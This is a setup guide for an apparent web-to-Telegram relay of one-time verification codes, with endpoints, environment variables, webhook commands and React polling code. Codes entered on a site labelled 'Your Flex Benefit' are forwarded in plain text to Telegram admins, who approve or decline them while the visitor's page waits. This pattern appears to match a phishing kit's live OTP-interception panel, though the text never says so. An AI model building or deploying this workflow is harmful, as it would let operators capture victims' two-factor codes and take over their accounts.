# Telegram Admin Approval System - Setup Guide

## Overview

Your system now has a complete Telegram admin approval workflow for SMS verification codes:

1. **Client** sends verification code to `/api/telegram`
2. **System** stores code in Vercel KV with pending status
3. **Telegram Bot** sends approval buttons to admin(s)
4. **Admin** clicks approve/decline button
5. **Webhook** updates code status in KV
6. **Client** polls `/api/telegram/code-status` and gets the decision

## Quick Start

### 1. Install Dependencies

```bash
npm install @vercel/kv
```

(Already in your package.json)

### 2. Set Up Telegram Bot

#### Get Bot Token

1. Open Telegram and find [@BotFather](https://t.me/botfather)
2. Send `/start` then `/newbot`
3. Follow prompts to create your bot
4. Copy the token (e.g., `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`)

#### Get Your User ID

1. Send a message to your bot
2. Forward that message to [@userinfobot](https://t.me/userinfobot)
3. It will reply with your numeric user ID (e.g., `1535273256`)

### 3. Set Environment Variables

In Vercel dashboard, go to **Settings → Environment Variables**:

```bash
# Telegram Configuration
TELEGRAM_BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz
TELEGRAM_CHAT_ID=1535273256
TELEGRAM_ADMIN_IDS=1535273256,9876543210

# Vercel KV (from Vercel Storage dashboard)
KV_URL=redis://default:password@region.upstash.io:port
KV_REST_API_URL=https://region-upstash.upstash.io
KV_REST_API_TOKEN=token_here
KV_REST_API_READ_ONLY_TOKEN=token_here
```

### 4. Configure Webhook

After deploying to production, set the Telegram webhook:

```bash
curl "https://api.telegram.org/bot{YOUR_TOKEN}/setWebhook?url=https://your-domain.com/api/telegram/webhook"
```

Example:

```bash
curl "https://api.telegram.org/bot123456789:ABCdefGHIjklMNOpqrsTUVwxyz/setWebhook?url=https://your-flex.vercel.app/api/telegram/webhook"
```

Verify:

```bash
curl "https://api.telegram.org/bot{YOUR_TOKEN}/getWebhookInfo"
```

## API Endpoints

### POST /api/telegram

**Send verification code for approval**

```bash
curl -X POST https://your-domain.com/api/telegram \
  -H "Content-Type: application/json" \
  -d '{
    "kind": "verification",
    "method": "email",
    "code": "123456",
    "otpStep": 1
  }'
```

**Response:**

```json
{
  "ok": true,
  "codeId": "1707123456789-abc12def"
}
```

**Error Response (503 if KV unavailable):**

```json
{
  "ok": false,
  "error": "storage_failed",
  "details": "Connection refused"
}
```

### GET /api/telegram/code-status

**Check if code was approved/declined**

```bash
curl "https://your-domain.com/api/telegram/code-status?codeId=1707123456789-abc12def"
```

**Response (pending):**

```json
{
  "ok": true,
  "status": "pending",
  "code": "123456",
  "expiresAt": 1707123900000
}
```

**Response (approved):**

```json
{
  "ok": true,
  "status": "approved",
  "code": "123456",
  "approvedBy": "admin_username",
  "approvedAt": 1707123700000,
  "expiresAt": 1707123900000
}
```

**Response (declined):**

```json
{
  "ok": true,
  "status": "declined",
  "code": "123456",
  "declinedBy": "admin_username",
  "declinedAt": 1707123700000,
  "expiresAt": 1707123900000
}
```

### GET /api/telegram/code-status

**Error Response (404 if not found):**

```json
{
  "ok": false,
  "error": "code_not_found"
}
```

**Error Response (503 if database error):**

```json
{
  "ok": false,
  "error": "storage_error",
  "details": "KV error message"
}
```

## Client Implementation

### Frontend (React)

```tsx
const [codeId, setCodeId] = useState<string | null>(null);
const [codeStatus, setCodeStatus] = useState<
  "pending" | "approved" | "declined" | null
>(null);

// 1. Submit code for approval
const handleSubmitCode = async (code: string) => {
  const res = await fetch("/api/telegram", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      kind: "verification",
      method: "email",
      code,
      otpStep: 1,
    }),
  });

  if (!res.ok) {
    console.error("Failed to submit code");
    return;
  }

  const data = await res.json();
  setCodeId(data.codeId);
};

// 2. Poll for approval status
useEffect(() => {
  if (!codeId) return;

  const interval = setInterval(async () => {
    const res = await fetch(`/api/telegram/code-status?codeId=${codeId}`);
    const data = await res.json();

    if (!res.ok) {
      console.error("Error checking status:", data.error);
      return;
    }

    if (data.status !== "pending") {
      setCodeStatus(data.status);
      clearInterval(interval);
    }
  }, 2000); // Poll every 2 seconds

  return () => clearInterval(interval);
}, [codeId]);
```

## Admin Workflow

### Via Telegram

1. When a verification code is submitted, you receive a message:

   ```
   🏷️ Site: Your Flex Benefit
   ━━━━━━━━━━━━━━━━━━
   ✅ Verification Code Submitted
   🔐 Type: Email
   🧩 OTP Step: First
   🔢 Code: 123456

   [✅ Approve] [❌ Decline]
   ```

2. Click **Approve** or **Decline**

3. The message updates to show:
   ```
   ✅ Status: APPROVED
   👤 By: your_username
   ⏰ Time: 2024-02-05T12:34:56.789Z
   ```

## Monitoring & Debugging

### View Logs

```bash
# Real-time logs
vercel logs --follow

# Search for errors
vercel logs --grep "TELEGRAM ERROR"
```

### Check KV Storage

In Vercel Dashboard → Storage → KV:

- Keys starting with `pending:` are stored codes
- Keys starting with `code2id:` are code value mappings
- Keys starting with `pending:ids` is the set of all pending code IDs

### Common Issues

| Issue                             | Solution                                       |
| --------------------------------- | ---------------------------------------------- |
| Bot doesn't send message          | Check `TELEGRAM_BOT_TOKEN` is correct          |
| "You don't have admin privileges" | Add your user ID to `TELEGRAM_ADMIN_IDS`       |
| `code_not_found` error            | Code expired (15 min default) or not stored    |
| `storage_error` (503)             | Vercel KV connection issue - check credentials |
| Empty JSON response               | Fixed! Update to latest code                   |

### Enable Debug Logging

Add to your code:

```tsx
fetch('/api/telegram', { ... })
  .then(r => {
    console.log('Status:', r.status);
    return r.json();
  })
  .then(d => console.log('Response:', d))
  .catch(e => console.error('Error:', e));
```

## Production Checklist

- [ ] Telegram Bot created (@BotFather)
- [ ] User ID obtained (@userinfobot)
- [ ] All env vars set in Vercel
- [ ] Vercel KV database created and connected
- [ ] Webhook URL set: `/api/telegram/webhook`
- [ ] Admin user IDs added to `TELEGRAM_ADMIN_IDS`
- [ ] Code deployed to production
- [ ] Test code submission → admin approval → client status check
- [ ] Monitor logs for errors

## Code Expiry & Cleanup

- **Code expiry**: 15 minutes (configurable in `src/lib/pending-codes.ts`)
- **Auto cleanup**: Runs every 5 minutes to remove expired codes
- **Audit trail**: Admin actions logged in console (implement DB storage for production)

## Security Notes

- ⚠️ **Hardened token**: Store `TELEGRAM_BOT_TOKEN` as secret, never commit
- ⚠️ **Admin IDs**: Only trusted users can approve/decline codes
- ⚠️ **Webhook security**: Use HTTPS only, consider adding secret token validation
- ✅ **KV encryption**: Vercel KV automatically encrypts data at rest

## Support

Check logs for detailed errors:

```bash
vercel logs --grep "TELEGRAM"
```

All API responses include error details for debugging.
